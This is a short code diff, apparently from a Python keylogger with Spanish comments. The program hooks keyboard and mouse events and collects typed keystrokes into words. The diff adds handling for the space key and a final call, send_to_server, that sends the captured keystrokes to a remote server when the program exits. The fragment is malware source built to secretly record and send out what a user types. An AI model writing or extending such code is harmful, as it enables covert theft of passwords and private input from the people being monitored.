@@ -17,6 +17,7 @@ def key(pulso):  # Función callback para detectar cuando se presiona una tecla
     global palabra
     if pulso.event_type == keyboard.KEY_DOWN:
         if pulso.name == "space":
+            palabra += " "
             save_word()
         elif len(pulso.name) == 1 and pulso.name.isprintable():
             palabra += pulso.name
@@ -63,5 +64,6 @@ try:
 except KeyboardInterrupt:
     pass
 finally:
+    send_to_server(palabra)
     keyboard.unhook_all()
     mouse.unhook_all()
